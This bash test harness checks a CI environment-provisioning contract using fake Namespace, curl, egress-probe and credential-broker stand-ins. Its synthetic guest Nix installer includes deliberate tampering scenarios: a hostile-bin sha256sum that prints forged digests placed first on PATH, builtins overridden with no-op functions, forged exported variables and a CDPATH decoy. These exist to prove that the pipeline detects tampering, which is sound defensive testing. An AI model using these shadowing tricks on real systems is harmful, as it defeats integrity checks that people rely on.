#!/usr/bin/env bash
# Fully local proof of the diene-ci-k3d/v1 compatibility contract. The fake
# Namespace CLI implements only the measured nsc v0.0.532 lifecycle surface;
# every other verb or argument is a test failure by construction.
# Test scenarios deliberately reuse environment names in isolated subshells.
# shellcheck disable=SC2030,SC2031
set -euo pipefail

script_dir=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
template_root=$(cd -- "$script_dir/../.." && pwd)
scratch=$(mktemp -d)
nix_shell_home=$scratch/nix-shell-home
cleanup_scratch() {
  chmod -R u+rwX "$scratch" 2>/dev/null || true
  rm -r -- "$scratch"
}
trap cleanup_scratch EXIT
install -d -m 0700 "$nix_shell_home"

passed=0
fail() {
  printf 'FAIL: %s\n' "$*" >&2
  exit 1
}
ok() {
  passed=$((passed + 1))
  printf '  ok %s\n' "$*"
}
expect_refusal() {
  local reason=${1:?reason required}
  shift
  if "$@" >"$scratch/stdout" 2>"$scratch/stderr"; then
    fail "expected $reason refusal but the command succeeded"
  fi
  grep -Fq -- "$reason" "$scratch/stderr" || {
    sed -n '1,160p' "$scratch/stderr" >&2
    fail "missing $reason evidence"
  }
  ok "refuses $reason"
}
expect_refusal_message() {
  local reason=${1:?reason required} message=${2:?message required}
  shift 2
  if "$@" >"$scratch/stdout" 2>"$scratch/stderr"; then
    fail "expected $reason refusal but the command succeeded"
  fi
  grep -Fxq -- "$reason: $message" "$scratch/stderr" || {
    sed -n '1,160p' "$scratch/stderr" >&2
    fail "missing exact $reason evidence: $message"
  }
  ok "refuses $reason ($message)"
}
expect_precreate_refusal() {
  local reason=${1:?reason required}
  shift
  : >"$FAKE_NSC_LOG"
  if (cd -- "$work" && "$@") >"$scratch/stdout" 2>"$scratch/stderr"; then
    fail "expected pre-create $reason refusal but the command succeeded"
  fi
  grep -Fq -- "$reason" "$scratch/stderr" || {
    sed -n '1,160p' "$scratch/stderr" >&2
    fail "missing pre-create $reason evidence"
  }
  ! grep -Eq '^create( |$)' "$FAKE_NSC_LOG" ||
    fail "$reason was reached only after fake nsc create"
  ok "$reason refuses before nsc create"
}

for command in jq yq check-jsonschema sha256sum tar grep sed awk find timeout rg base64 stat nix cmp readlink diff; do
  command -v "$command" >/dev/null 2>&1 || fail "$command is required for the contract suite"
done

SOURCE_SHA=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
ARTIFACT_DIGEST=sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
ATTESTATION_DIGEST=sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc
CLOSURE_DIGEST=sha256:dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
CLOSURE_SIGNATURE_DIGEST=sha256:eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
CLOSURE_ROOT_DIGEST=sha256:ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
GARDEN_DIGEST=sha256:1111111111111111111111111111111111111111111111111111111111111111
CANARY_IMAGE=registry.example.test/diene-egress-canary@sha256:2222222222222222222222222222222222222222222222222222222222222222
WORKFLOW_REF="AtomiCloud/example/.github/workflows/environment-k3d.yaml@$SOURCE_SHA"

work=$scratch/work
install -d -m 0700 "$work/scripts/ci" "$work/schemas" \
  "$work/.github/workflows" \
  "$work/.diene/ci/fixtures/demo" "$work/.diene/ci/fixtures/bootstrap-fleet-independence-v1"
cp -R "$template_root/schemas/ci" "$work/schemas/"
cp "$script_dir"/environment-*.sh "$work/scripts/ci/"
cp "$template_root/.github/workflows/⚡reusable-environment-k3d.yaml" "$work/.github/workflows/"
chmod 0755 "$work/scripts/ci"/*.sh

# The production pins remain asserted from template_root below. The synthetic
# lifecycle copy uses tiny deterministic stand-ins so every fake Namespace run
# exercises the real fetch/length/digest/publish/upload rail without a network
# dependency or a repeated 73 MB transfer.
guest_nix_fixture_dir=$scratch/guest-nix-fixture
install -d -m 0700 "$guest_nix_fixture_dir"
printf '%s\n' '#!/bin/sh' 'printf provenance-witness-only' \
  >"$guest_nix_fixture_dir/guest-nix-bootstrap.sh"
cat >"$guest_nix_fixture_dir/guest-nix-installer" <<'GUEST_NIX_INSTALLER'
#!/bin/sh
set -eu

rail_harness=/run/diene-ci/harness
rail_scenario=$(cat "$rail_harness/scenario")

record_rail_event() {
  printf '%s\n' "$1" >>"$rail_harness/events"
  chmod 0600 "$rail_harness/events"
}

record_rail_environment() {
  rail_environment_target=$1
  tr '\000' '\n' <"/proc/$$/environ" | LC_ALL=C sort >"$rail_environment_target"
  chmod 0600 "$rail_environment_target"
}

if [ "$#" -eq 1 ] && [ "$1" = --version ]; then
  grep -Fxq 'executionMode=direct-pinned-binary' \
    /run/diene-ci/evidence/guest-nix/verified.txt
  grep -Fxq 'payloadDigestVerified=true' \
    /run/diene-ci/evidence/guest-nix/verified.txt
  record_rail_event uploads-verified
  printf '%s\n' "$@" >"$rail_harness/installer-version.argv"
  chmod 0600 "$rail_harness/installer-version.argv"
  record_rail_environment "$rail_harness/installer-version.env"
  record_rail_event installer-version
  case $rail_scenario in
    version-wrong) printf '%s\n' 'nix-installer 3.21.8' ;;
    version-stderr)
      printf '%s\n' 'nix-installer 3.21.9'
      printf '%s\n' warning >&2
      ;;
    *) printf '%s\n' 'nix-installer 3.21.9' ;;
  esac
  exit 0
fi

if [ "$#" -ne 5 ] || [ "$1" != install ] || [ "$2" != linux ] ||
  [ "$3" != --no-confirm ] || [ "$4" != --init ] || [ "$5" != none ]; then
  exit 97
fi
printf '%s\n' "$@" >"$rail_harness/installer-install.argv"
chmod 0600 "$rail_harness/installer-install.argv"
record_rail_environment "$rail_harness/installer-install.env"
record_rail_event installer-install
[ "$rail_scenario" != install-fail ] || exit 23
[ "$rail_scenario" != config-unsafe ] || exit 0

install -d -m 0700 /etc/nix /nix /nix/var/nix/profiles/default/bin \
  /nix/var/nix/profiles/default/etc/profile.d \
  /nix/store/diene-guest-rail/etc/profile.d
printf '%s\n' 'sandbox = false' >/etc/nix/nix.conf
chmod 0600 /etc/nix/nix.conf
install -m 0500 /run/diene-ci/guest-nix-installer /nix/nix-installer

case $rail_scenario in
  s12g-path-shadow | s12h-all-vectors)
    rail_pinned_config_digest=$(sha256sum /etc/nix/nix.conf | cut -d' ' -f1)
    install -d -m 0700 /nix/hostile-bin
    {
      printf '%s\n' '#!/bin/sh'
      printf "printf '%%s  /etc/nix/nix.conf\\n' '%s'\n" "$rail_pinned_config_digest"
    } >/nix/hostile-bin/sha256sum
    chmod 0500 /nix/hostile-bin/sha256sum
    if [ "$rail_scenario" = s12h-all-vectors ]; then
      printf '%s\n' '#!/bin/sh' 'printf "%s\n" forged' >/nix/hostile-bin/cut
      printf '%s\n' '#!/bin/sh' 'printf "%s\n" forged' >/nix/hostile-bin/env
      chmod 0500 /nix/hostile-bin/cut /nix/hostile-bin/env
    fi
    ;;
  s12l-cdpath)
    install -d -m 0700 /nix/decoy/source/scripts/ci
    printf '%s\n' '#!/bin/sh' 'exit 99' \
      >/nix/decoy/source/scripts/ci/environment-k3d-run.sh
    chmod 0500 /nix/decoy/source/scripts/ci/environment-k3d-run.sh
    ;;
esac

case $rail_scenario in
  profile-missing) ;;
  profile-dangling)
    ln -s /nix/store/diene-guest-rail-missing/etc/profile.d/nix-daemon.sh \
      /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh
    ;;
  profile-outside)
    printf '%s\n' 'return 0' >"$rail_harness/outside-profile.sh"
    chmod 0600 "$rail_harness/outside-profile.sh"
    ln -s /run/diene-ci/harness/outside-profile.sh \
      /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh
    ;;
  *)
    cat >/nix/store/diene-guest-rail/etc/profile.d/nix-daemon.sh <<'GUEST_NIX_PROFILE'
rail_harness=/run/diene-ci/harness
rail_scenario=$(cat "$rail_harness/scenario")
[ -f /etc/nix/nix.conf ] || return 91
printf '%s\n' nix-config-bound profile-resolved >>"$rail_harness/events"
chmod 0600 "$rail_harness/events"
if [ "$rail_scenario" = profile-source-fail ]; then
  return 23
fi
PATH=/nix/var/nix/profiles/default/bin:$PATH
NIX_PROFILES=/nix/var/nix/profiles/default
NIX_SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt
export PATH NIX_PROFILES NIX_SSL_CERT_FILE
printf '%s\n' profile-sourced >>"$rail_harness/events"
chmod 0600 "$rail_harness/events"
case $rail_scenario in
  config-mutated)
    printf '%s\n' 'post-profile-mutation = true' >>/etc/nix/nix.conf
    return 0
    ;;
  s12c-digest-rebind)
    printf '%s\n' 's12c-digest-rebind = true' >>/etc/nix/nix.conf
    guest_nix_etc_config_digest=$(sha256sum /etc/nix/nix.conf | cut -d' ' -f1)
    printf '%s\n' "$rail_scenario" >"$rail_harness/injection-ran"
    chmod 0600 "$rail_harness/injection-ran"
    return 0
    ;;
  s12d-fail-noop)
    printf '%s\n' 's12d-fail-noop = true' >>/etc/nix/nix.conf
    printf '%s\n' "$rail_scenario" >"$rail_harness/injection-ran"
    chmod 0600 "$rail_harness/injection-ran"
    guest_nix_fail() { :; }
    return 0
    ;;
  s12e-hash-rebind)
    rail_original_config_digest=$(sha256sum /etc/nix/nix.conf | cut -d' ' -f1)
    printf '%s\n' 's12e-hash-rebind = true' >>/etc/nix/nix.conf
    printf '%s\n' "$rail_scenario" >"$rail_harness/injection-ran"
    chmod 0600 "$rail_harness/injection-ran"
    guest_nix_hash_etc_config() { printf '%s\n' "$rail_original_config_digest"; }
    return 0
    ;;
  s12g-path-shadow)
    printf '%s\n' 's12g-path-shadow = true' >>/etc/nix/nix.conf
    printf '%s\n' "$rail_scenario" >"$rail_harness/injection-ran"
    chmod 0600 "$rail_harness/injection-ran"
    PATH=/nix/hostile-bin:$PATH
    export PATH
    return 0
    ;;
  s12h-all-vectors)
    rail_original_config_digest=$(sha256sum /etc/nix/nix.conf | cut -d' ' -f1)
    printf '%s\n' 's12h-all-vectors = true' >>/etc/nix/nix.conf
    printf '%s\n' "$rail_scenario" >"$rail_harness/injection-ran"
    chmod 0600 "$rail_harness/injection-ran"
    guest_nix_etc_config_digest=deadbeef
    guest_nix_bound_config_digest=$rail_original_config_digest
    guest_nix_etc_config_digest_after_profile=$rail_original_config_digest
    guest_nix_profile_rc=0
    guest_nix_stage1='printf skipped'
    guest_nix_stage2='printf skipped'
    guest_nix_fail() { :; }
    guest_nix_hash_etc_config() { printf '%s\n' "$rail_original_config_digest"; }
    guest_nix_source_profile() { :; }
    sha256sum() { printf '%s  /etc/nix/nix.conf\n' "$rail_original_config_digest"; }
    cut() { :; }
    env() { :; }
    printf() { :; }
    exec() { :; }
    exit() { :; }
    command() { :; }
    set -- junk junk junk
    PATH=/nix/hostile-bin:$PATH
    export PATH
    return 0
    ;;
  s12i-readonly)
    printf '%s\n' 's12i-readonly = true' >>/etc/nix/nix.conf
    printf '%s\n' "$rail_scenario" >"$rail_harness/injection-ran"
    chmod 0600 "$rail_harness/injection-ran"
    readonly guest_nix_profile_rc=0
    return 0
    ;;
  s12l-cdpath)
    printf '%s\n' "$rail_scenario" >"$rail_harness/injection-ran"
    chmod 0600 "$rail_harness/injection-ran"
    CDPATH=/nix/decoy
    export CDPATH
    return 0
    ;;
  s12n-export-names)
    printf '%s\n' 's12n-export-names = true' >>/etc/nix/nix.conf
    printf '%s\n' "$rail_scenario" >"$rail_harness/injection-ran"
    chmod 0600 "$rail_harness/injection-ran"
    guest_nix_bound_config_digest=forged
    guest_nix_etc_config_digest=forged
    guest_nix_etc_config_digest_after_profile=forged
    guest_nix_profile_rc=0
    guest_nix_develop_path=/nix/hostile-bin
    guest_nix_profile_names=forged
    guest_nix_profile_names_unsorted=forged
    guest_nix_profile_environment=forged
    guest_nix_stage1='printf skipped'
    guest_nix_stage2='printf skipped'
    export guest_nix_bound_config_digest guest_nix_etc_config_digest \
      guest_nix_etc_config_digest_after_profile guest_nix_profile_rc \
      guest_nix_develop_path guest_nix_profile_names \
      guest_nix_profile_names_unsorted guest_nix_profile_environment \
      guest_nix_stage1 guest_nix_stage2
    return 0
    ;;
  s12p-return-shadow)
    printf '%s\n' 's12p-return-shadow = true' >>/etc/nix/nix.conf
    printf '%s\n' "$rail_scenario" >"$rail_harness/injection-ran"
    chmod 0600 "$rail_harness/injection-ran"
    return() { :; }
    set() { :; }
    false
    ;;
  *) return 0 ;;
esac
GUEST_NIX_PROFILE
    chmod 0600 /nix/store/diene-guest-rail/etc/profile.d/nix-daemon.sh
    ln -s /nix/store/diene-guest-rail/etc/profile.d/nix-daemon.sh \
      /nix/var/nix/profiles/default/etc/profile.d/nix-daemon.sh
    ;;
esac

if [ "$rail_scenario" != nix-absent ]; then
  cat >/nix/var/nix/profiles/default/bin/nix <<'GUEST_NIX_STUB'
#!/bin/sh
set -eu
rail_harness=/run/diene-ci/harness
if [ "$#" -eq 1 ] && [ "$1" = --version ]; then
  printf '%s\n' "$@" >"$rail_harness/nix-version.argv"
  grep -Fxq 'home=/run/diene-ci/home' /run/diene-ci/evidence/guest-nix/environment.txt
  grep -Fxq 'xdgConfigHome=/run/diene-ci/home/.config' \
    /run/diene-ci/evidence/guest-nix/environment.txt
  grep -Fxq 'userConfFiles=/run/diene-ci/nix-user.conf' \
    /run/diene-ci/evidence/guest-nix/environment.txt
  rail_config_digest=$(sha256sum /etc/nix/nix.conf | cut -d' ' -f1)
  grep -Fxq "etcNixConf=$rail_config_digest" \
    /run/diene-ci/evidence/guest-nix/environment.txt
  sha256sum /nix/nix-installer >"$rail_harness/installed-copy.sha256"
  printf '%s\n' environment-bound nix-config-rechecked direct-nix-version \
    >>"$rail_harness/events"
  chmod 0600 "$rail_harness/nix-version.argv" \
    "$rail_harness/installed-copy.sha256" "$rail_harness/events"
  printf '%s\n' 'nix (Determinate Nix 3.21.9) 2.34.8'
  exit 0
fi
printf '%s\n' "$@" >"$rail_harness/nix-develop.argv"
pwd >"$rail_harness/nix-develop.cwd"
printf '%s\n' nix-develop >>"$rail_harness/events"
chmod 0600 "$rail_harness/nix-develop.argv" "$rail_harness/nix-develop.cwd" \
  "$rail_harness/events"
exit 0
GUEST_NIX_STUB
  chmod 0500 /nix/var/nix/profiles/default/bin/nix
fi
GUEST_NIX_INSTALLER
chmod 0600 "$guest_nix_fixture_dir/guest-nix-bootstrap.sh" \
  "$guest_nix_fixture_dir/guest-nix-installer"
guest_nix_fixture_installer_digest="sha256:$(sha256sum "$guest_nix_fixture_dir/guest-nix-bootstrap.sh" | awk '{print $1}')"
guest_nix_fixture_payload_digest="sha256:$(sha256sum "$guest_nix_fixture_dir/guest-nix-installer" | awk '{print $1}')"
guest_nix_fixture_installer_bytes=$(wc -c <"$guest_nix_fixture_dir/guest-nix-bootstrap.sh")
guest_nix_fixture_payload_bytes=$(wc -c <"$guest_nix_fixture_dir/guest-nix-installer")
sed -i \
  -e "s|^DIENE_GUEST_NIX_INSTALLER_DIGEST=.*|DIENE_GUEST_NIX_INSTALLER_DIGEST=$guest_nix_fixture_installer_digest|" \
  -e "s|^DIENE_GUEST_NIX_INSTALLER_BYTES=.*|DIENE_GUEST_NIX_INSTALLER_BYTES=$guest_nix_fixture_installer_bytes|" \
  -e "s|^DIENE_GUEST_NIX_PAYLOAD_DIGEST=.*|DIENE_GUEST_NIX_PAYLOAD_DIGEST=$guest_nix_fixture_payload_digest|" \
  -e "s|^DIENE_GUEST_NIX_PAYLOAD_BYTES=.*|DIENE_GUEST_NIX_PAYLOAD_BYTES=$guest_nix_fixture_payload_bytes|" \
  "$work/scripts/ci/environment-lib.sh"

fake_guest_nix_curl=$scratch/guest-nix-curl
cat >"$fake_guest_nix_curl" <<'CURL'
#!/usr/bin/env bash
set -euo pipefail
printf '%q ' "$@" >>"${FAKE_GUEST_NIX_CURL_LOG:?}"
printf '\n' >>"$FAKE_GUEST_NIX_CURL_LOG"
output=
url=
max_redirs=
while (($#)); do
  case $1 in
    --output) output=${2:?}; shift 2 ;;
    --max-redirs) max_redirs=${2:?}; shift 2 ;;
    --proto | --proto-redir | --max-time | --retry) shift 2 ;;
    --fail | --show-error | --silent | --tlsv1.2 | --location) shift ;;
    https://*) url=$1; shift ;;
    *) exit 127 ;;
  esac
done
[[ -n $output && -n $url && -n $max_redirs ]] || exit 127
scenario=${FAKE_GUEST_NIX_FETCH_SCENARIO:-happy}
case $scenario in
  redirect) exit 47 ;;
  transport-fail) exit 22 ;;
esac
# The redirect budget is part of the artifact class contract, not a transport
# detail the caller may pick freely: guest Nix must still refuse every 3xx and
# only the digest-pinned Wolfi package class may follow the one measured 303.
case $url in
  */nix-installer-x86_64-linux)
    source_file=${FAKE_GUEST_NIX_SOURCE_DIR:?}/guest-nix-installer; kind=payload; allowed_redirs=0
    ;;
  */tag/v3.21.9)
    source_file=${FAKE_GUEST_NIX_SOURCE_DIR:?}/guest-nix-bootstrap.sh; kind=installer; allowed_redirs=0
    ;;
  https://apk.cgr.dev/chainguard/x86_64/*.apk)
    source_file=${FAKE_GUEST_TOOLCHAIN_SOURCE_DIR:?}/${url##*/}; kind=apk; allowed_redirs=1
    ;;
  *) exit 127 ;;
esac
[[ $max_redirs == "$allowed_redirs" ]] || exit 47
[[ -f $source_file ]] || exit 22
case $scenario in
  "$kind-short") printf x >"$output" ;;
  "$kind-digest")
    cp "$source_file" "$output"
    printf X | dd of="$output" bs=1 seek=0 conv=notrunc status=none
    ;;
  happy) cp "$source_file" "$output" ;;
  *) cp "$source_file" "$output" ;;
esac
CURL
chmod 0755 "$fake_guest_nix_curl"

# The Wolfi guest toolchain is proved by really installing it, so the harness
# needs the exact pinned package bytes. They are acquired reproducibly into
# scratch and accepted only at their fixed length and digest, so the pin table
# in production remains the sole authority; nothing is added to the repository.
# DIENE_CONTRACT_APK_CACHE is an optional offline byte source that is still
# subject to the same unconditional length and digest proof.
guest_toolchain_apk_dir=$scratch/guest-toolchain-apk
install -d -m 0700 "$guest_toolchain_apk_dir"
mapfile -t guest_toolchain_pins < <(
  # shellcheck source=/dev/null
  source "$template_root/scripts/ci/environment-lib.sh"
  printf '%s\n' "$DIENE_GUEST_TOOLCHAIN_PACKAGES"
)
guest_toolchain_repo_base=$(
  # shellcheck source=/dev/null
  source "$template_root/scripts/ci/environment-lib.sh"
  printf '%s\n' "$DIENE_GUEST_TOOLCHAIN_REPO_BASE"
)
[[ ${#guest_toolchain_pins[@]} == 10 && $guest_toolchain_repo_base == https://* ]] ||
  fail 'the production Wolfi toolchain closure is not the measured ten pinned packages'
guest_toolchain_files=()
guest_toolchain_uploads=()
for guest_toolchain_pin in "${guest_toolchain_pins[@]}"; do
  IFS='|' read -r guest_toolchain_pin_name guest_toolchain_pin_version \
    guest_toolchain_pin_bytes guest_toolchain_pin_digest <<<"$guest_toolchain_pin"
  guest_toolchain_file="$guest_toolchain_pin_name-$guest_toolchain_pin_version.apk"
  guest_toolchain_files+=("$guest_toolchain_file")
  guest_toolchain_uploads+=("/run/diene-ci/gnu/$guest_toolchain_file"
    "/run/diene-ci/gnu/$guest_toolchain_file.sha256")
  guest_toolchain_target=$guest_toolchain_apk_dir/$guest_toolchain_file
  if [[ -n ${DIENE_CONTRACT_APK_CACHE:-} && -f ${DIENE_CONTRACT_APK_CACHE:-}/$guest_toolchain_file ]]; then
    install -m 0600 "$DIENE_CONTRACT_APK_CACHE/$guest_toolchain_file" "$guest_toolchain_target"
  else
    command -v curl >/dev/null 2>&1 ||
      fail "curl is required to acquire the pinned Wolfi package $guest_toolchain_file"
    curl --fail --show-error --silent --proto '=https' --proto-redir '=https' --tlsv1.2 \
      --location --max-redirs 1 --max-time 300 --retry 0 \
      --output "$guest_toolchain_target" "$guest_toolchain_repo_base/$guest_toolchain_file" ||
      fail "the pinned Wolfi package $guest_toolchain_file could not be acquired for the harness"
    chmod 0600 "$guest_toolchain_target"
  fi
  [[ $(wc -c <"$guest_toolchain_target") == "$guest_toolchain_pin_bytes" ]] ||
    fail "the acquired $guest_toolchain_file does not match its pinned byte length"
  [[ "sha256:$(sha256sum "$guest_toolchain_target" | awk '{print $1}')" == "$guest_toolchain_pin_digest" ]] ||
    fail "the acquired $guest_toolchain_file does not match its pinned digest"
  if [[ -n ${DIENE_CONTRACT_APK_CACHE:-} && -d ${DIENE_CONTRACT_APK_CACHE:-} &&
    ! -f ${DIENE_CONTRACT_APK_CACHE:-}/$guest_toolchain_file ]]; then
    install -m 0600 "$guest_toolchain_target" "$DIENE_CONTRACT_APK_CACHE/$guest_toolchain_file"
  fi
done
guest_toolchain_good_packages=$(printf '%s\n' "${guest_toolchain_pins[@]}")

# The independent expectation of the twenty-one proven utilities, the two
# behaviour proofs, and the three BusyBox tar facts. It is written here rather
# than read back out of the production text, so a silent narrowing of the
# proven set cannot pass either the real Wolfi rail or the runner-side proof.
guest_toolchain_identity_rows=(
  'sed|/usr/bin/sed|/usr/bin/sed|(GNU sed)'
  'grep|/usr/bin/grep|/usr/bin/grep|(GNU grep)'
  'awk|/usr/bin/awk|/usr/bin/gawk|GNU Awk'
  'find|/usr/bin/find|/usr/bin/find|(GNU findutils)'
  'xargs|/usr/bin/xargs|/usr/bin/xargs|(GNU findutils)'
  'sha256sum|/usr/bin/sha256sum|/usr/bin/coreutils|(GNU coreutils)'
  'stat|/usr/bin/stat|/usr/bin/coreutils|(GNU coreutils)'
  'cut|/usr/bin/cut|/usr/bin/coreutils|(GNU coreutils)'
  'sort|/usr/bin/sort|/usr/bin/coreutils|(GNU coreutils)'
  'head|/usr/bin/head|/usr/bin/coreutils|(GNU coreutils)'
  'wc|/usr/bin/wc|/usr/bin/coreutils|(GNU coreutils)'
  'date|/usr/bin/date|/usr/bin/coreutils|(GNU coreutils)'
  'tr|/usr/bin/tr|/usr/bin/coreutils|(GNU coreutils)'
  'cat|/usr/bin/cat|/usr/bin/coreutils|(GNU coreutils)'
  'install|/usr/bin/install|/usr/bin/coreutils|(GNU coreutils)'
  'readlink|/usr/bin/readlink|/usr/bin/coreutils|(GNU coreutils)'
  'id|/usr/bin/id|/usr/bin/coreutils|(GNU coreutils)'
  'mktemp|/usr/bin/mktemp|/usr/bin/coreutils|(GNU coreutils)'
  'chmod|/usr/bin/chmod|/usr/bin/coreutils|(GNU coreutils)'
  'rm|/usr/bin/rm|/usr/bin/coreutils|(GNU coreutils)'
  'uname|/usr/bin/uname|/usr/bin/coreutils|(GNU coreutils)'
)
guest_toolchain_write_expected_identity() {
  local row name binary logical token
  for row in "${guest_toolchain_identity_rows[@]}"; do
    IFS='|' read -r name binary logical token <<<"$row"
    printf '%s|%s|%s|%s \n' "$name" "$binary" "$logical" "$token"
  done
  printf '%s\n' behaviorSha256sumCheck=pass behaviorSedInPlace=pass \
    tarImplementation=busybox tarResolvedPath=/usr/bin/busybox \
    tarPortableFlags=-cf,-tf,-tvf,-xf,-C,-f tarTypeCharacter=-
}
guest_toolchain_write_expected_pins() {
  printf '%s\n' executionMode=offline-pinned-apk
  tr '|' ' ' <<<"$guest_toolchain_good_packages"
}

# The lifecycle copy is an isolated synthetic rail. Override the downloader
# function only in that scratch copy; production still resolves and validates
# its immutable Nix-store curl, and no ambient path-valued hook exists.
{
  printf '\n%s\n' '# Harness-only downloader seam for the scratch lifecycle copy.'
  printf '%s\n' 'diene_pinned_downloader() {'
  printf "  printf '%%s\\n' '%s'\n" "$fake_guest_nix_curl"
  printf '%s\n' '}'
} >>"$work/scripts/ci/environment-lib.sh"

cat >"$work/.diene/ci/artifact-producer.sh" <<'SH'
#!/usr/bin/env bash
exit 0
SH
cat >"$work/.diene/ci/l7-enforcer" <<'SH'
#!/usr/bin/env bash
set -euo pipefail
printf '%q ' "$@" >>"${FAKE_L7_LOG:-/dev/null}"
printf '\n' >>"${FAKE_L7_LOG:-/dev/null}"
command=${1:-}
shift || true
case $command in
  apply)
    evidence=
    while (($#)); do
      case $1 in
        --profile | --receipt | --contract) shift 2 ;;
        --evidence) evidence=${2:?}; shift 2 ;;
        *) exit 127 ;;
      esac
    done
    [[ -n $evidence ]] || exit 127
    jq -n --argjson complete "${FAKE_L7_COMPLETE:-true}" \
      '{outcome:"Pass",dnsBound:true,sniBound:true,methodsBound:true,defaultDenied:$complete}' >"$evidence"
    ;;
  remove)
    [[ ${1:-} == --profile && ${3:-} == --receipt && $# -eq 4 ]] || exit 127
    ;;
  *) exit 127 ;;
esac
SH
cat >"$work/.diene/ci/egress-probe" <<'SH'
#!/usr/bin/env bash
set -euo pipefail
printf '%q ' "$@" >>"${FAKE_PROBE_LOG:-/dev/null}"
printf '\n' >>"${FAKE_PROBE_LOG:-/dev/null}"
scope=
profile=
cluster=
receipt=
transcript=
image=
while (($#)); do
  case $1 in
    --scope) scope=${2:?}; shift 2 ;;
    --profile) profile=${2:?}; shift 2 ;;
    --cluster-id) cluster=${2:?}; shift 2 ;;
    --receipt) receipt=${2:?}; shift 2 ;;
    --transcript) transcript=${2:?}; shift 2 ;;
    --image) image=${2:?}; shift 2 ;;
    *) exit 127 ;;
  esac
done
[[ -n $scope && -n $profile && -n $cluster && -n $receipt && -n $transcript ]] || exit 127
[[ $scope == pod && -n $image || $scope != pod && -z $image ]] || exit 127
[[ $scope != "${FAKE_PROBE_FAIL_SCOPE:-}" ]] || exit 65
[[ $scope != "${FAKE_PROBE_NO_TRANSCRIPT:-}" ]] || exit 0
case $scope in
  preexisting-open) ids='["preexisting-flow-established"]' ;;
  preexisting-transition) ids='["preexisting-flow-transition-denial"]' ;;
  host) ids='["host-metadata-denial","host-arbitrary-https-denial"]' ;;
  pod) ids='["pod-metadata-denial","pod-arbitrary-https-denial","pod-dns-denial"]' ;;
  *) exit 127 ;;
esac
install -d -m 0700 "$(dirname -- "$transcript")"
observed_cluster=$cluster
observed_outcome=Pass
observed_drop=
observed_reason=AdapterObservedDenial
observed_required=true
[[ $scope != preexisting-open ]] || observed_reason=AdapterObservedFlowEstablished
if [[ -z ${FAKE_PROBE_MUTATE_SCOPE:-} || $scope == "$FAKE_PROBE_MUTATE_SCOPE" ]]; then
  observed_cluster=${FAKE_PROBE_CLUSTER:-$cluster}
  observed_outcome=${FAKE_PROBE_OUTCOME:-Pass}
  observed_drop=${FAKE_PROBE_DROP_ID:-}
  observed_reason=${FAKE_PROBE_REASON:-$observed_reason}
  observed_required=${FAKE_PROBE_REQUIRED:-true}
fi
jq -n --arg scope "$scope" --arg profile "$profile" \
  --arg cluster "$observed_cluster" --arg receipt "$receipt" \
  --arg outcome "$observed_outcome" --arg drop "$observed_drop" \
  --arg reason "$observed_reason" --argjson required "$observed_required" --argjson ids "$ids" '
  {apiVersion:"diene.atomi.cloud/ci-egress-probe/v1",scope:$scope,profileId:$profile,
   clusterId:$cluster,receiptId:$receipt,
   observations:[$ids[] | select(. != $drop) |
     {id:.,outcome:$outcome,reasonCode:$reason,required:$required}]}
' >"$transcript"
SH
cat >"$work/.diene/ci/vendor-broker" <<'SH'
#!/usr/bin/env bash
set -euo pipefail
printf '%q ' "$@" >>"${FAKE_BROKER_LOG:-/dev/null}"
printf '\n' >>"${FAKE_BROKER_LOG:-/dev/null}"
command=${1:-}
shift || true
[[ $command != "${FAKE_BROKER_FAIL_COMMAND:-}" ]] || exit 69
case $command in
  issue)
    output=
    evidence=
    while (($#)); do
      case $1 in
        --action) shift 2 ;;
        --output) output=${2:?}; shift 2 ;;
        --evidence) evidence=${2:?}; shift 2 ;;
        *) exit 127 ;;
      esac
    done
    [[ -n $output && -n $evidence ]] || exit 127
    printf '%s\n' 'masked-contract-credential' >"$output"
    chmod 0600 "$output"
    jq -n '{outcome:"Pass",masked:true,issuedAfterReadiness:true}' >"$evidence"
    ;;
  revoke)
    while (($#)); do
      case $1 in
        --action | --credential-file | --absence-proven) shift 2 ;;
        *) exit 127 ;;
      esac
    done
    ;;
  *) exit 127 ;;
esac
SH
chmod 0755 "$work/.diene/ci/artifact-producer.sh" "$work/.diene/ci/l7-enforcer" \
  "$work/.diene/ci/egress-probe" "$work/.diene/ci/vendor-broker"

printf '%s\n' '{"apiVersion":"diene.atomi.cloud/ci-fixture/v1","id":"demo"}' \
  >"$work/.diene/ci/fixtures/demo/manifest.yaml"
printf '%s\n' '{"apiVersion":"diene.atomi.cloud/ci-fixture/v1","id":"bootstrap-fleet-independence-v1"}' \
  >"$work/.diene/ci/fixtures/bootstrap-fleet-independence-v1/manifest.yaml"
demo_pack_digest="sha256:$(sha256sum "$work/.diene/ci/fixtures/demo/manifest.yaml" | awk '{print $1}')"
fleet_pack_digest="sha256:$(sha256sum "$work/.diene/ci/fixtures/bootstrap-fleet-independence-v1/manifest.yaml" | awk '{print $1}')"
jq -n --arg demo "$demo_pack_digest" --arg fleet "$fleet_pack_digest" '
  def journey($id;$pack;$applies):
    {id:$id,componentClass:"K1",appliesTo:$applies,required:true,
     fixturePack:{id:$pack,version:"1.0.0",digest:(if $pack == "demo" then $demo else $fleet end)},
     setup:["/bin/true"],probe:["/bin/true"],cleanup:["/bin/true"],workingDirectory:".",
     timeoutSeconds:60,poll:{intervalSeconds:1,attempts:3},readinessLeaves:["EnvironmentReady"],
     assertions:["fixture responds"],safeReportFields:["id"]};
  {apiVersion:"diene.atomi.cloud/ci-journeys/v1",journeys:[
    journey("core-demo";"demo";[
      {lane:"ditto-build-local",profile:"ditto",buildMode:"build-local"},
      {lane:"ditto-target-pull",profile:"ditto",buildMode:"target-pull"},
      {lane:"absol",profile:"absol",buildMode:"build-local"}]),
    journey("fleet-demo";"bootstrap-fleet-independence-v1";[
      {lane:"fleet-independence",profile:"ditto",buildMode:"build-local",
       fixtureId:"bootstrap-fleet-independence-v1"}])
  ]}' >"$work/.diene/ci/journeys.v1.yaml"

